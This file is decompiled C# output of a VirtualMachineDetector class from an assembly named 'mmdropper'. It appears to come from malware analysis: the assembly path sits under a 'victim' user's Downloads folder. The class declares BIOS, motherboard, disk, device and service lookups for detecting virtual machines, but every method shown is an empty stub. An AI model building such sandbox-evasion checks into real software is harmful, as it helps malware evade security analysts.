// Decompiled with JetBrains decompiler
// Type: VirtualMachineDetector
// Assembly: mmdropper, Version=1.0.7321.42228, Culture=neutral, PublicKeyToken=null
// MVID: 67C14436-991D-42DC-A31E-001F369439CC
// Assembly location: C:\Users\victim\Downloads\AgileStringDecryptor-master\bin\Debug\net48\eulascr-StrDec.exe

using System.Collections.Generic;
using System.Runtime.CompilerServices;

#nullable disable
public class VirtualMachineDetector
{
  private static IVirtualEnvironment[] _detectors;
  private static ComputerSystem _computer;
  private static BIOS _bios;
  private static MotherboardDevice _motherboard;
  private static IEnumerable<DiskDrive> _disks;
  private static IEnumerable<PnPEntity> _devices;
  private static IEnumerable<WindowsService> _services;

  static VirtualMachineDetector()
  {
    // ISSUE: unable to decompile the method.
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  public static bool Assert(out string name) => false;

  [MethodImpl(MethodImplOptions.NoInlining)]
  public static bool Assert() => false;

  [MethodImpl(MethodImplOptions.NoInlining)]
  private static IEnumerable<WindowsService> GetWindowsServices()
  {
    return (IEnumerable<WindowsService>) null;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  private static T Create<T>(string key) => default (T);

  [MethodImpl(MethodImplOptions.NoInlining)]
  private static List<T> CreateList<T>(string key) => (List<T>) null;

  [MethodImpl(MethodImplOptions.NoInlining)]
  public VirtualMachineDetector()
  {
  }
}
